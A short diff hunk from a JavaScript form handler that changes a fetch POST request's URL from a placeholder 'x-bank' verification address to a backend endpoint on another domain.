@@ -14,7 +14,7 @@ document.getElementById('form').addEventListener('submit', function(event) {
     return false;
      }
 
-  fetch('https://x-bank/verify.html?code=12345', { 
+  fetch('https://x-bank.alsiberij.com/ms-users/', { 
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
